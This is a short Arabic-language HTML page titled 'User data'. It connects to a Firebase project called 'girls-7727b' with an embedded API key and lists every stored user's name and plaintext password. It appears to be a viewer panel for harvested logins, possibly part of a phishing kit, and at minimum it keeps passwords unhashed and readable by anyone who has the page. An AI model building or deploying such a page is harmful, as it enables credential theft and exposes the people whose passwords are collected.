<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>بيانات المستخدمين</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
</head>
<body style="direction: rtl; font-family: sans-serif; background: #222; color: #fff; padding: 20px;">
  <h2>بيانات المستخدمين</h2>
  <ul id="userList"></ul>

  <script>
    // إعدادات Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyDO9n4Q9V8QcSKhqZPLqDe3mUyaF2--wQc",
      authDomain: "girls-7727b.firebaseapp.com",
      projectId: "girls-7727b",
      databaseURL: "https://girls-7727b-default-rtdb.firebaseio.com",
      storageBucket: "girls-7727b.appspot.com",
      messagingSenderId: "225613522073",
      appId: "1:225613522073:web:19b45955286851a8920408",
    };

    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const userList = document.getElementById("userList");

    firebase.database().ref("users").on("value", snapshot => {
      userList.innerHTML = "";
      snapshot.forEach(child => {
        const data = child.val();
        const li = document.createElement("li");
        li.textContent = `الاسم: ${data.name} | كلمة السر: ${data.password}`;
        userList.appendChild(li);
      });
    });
  </script>
</body>
</html>
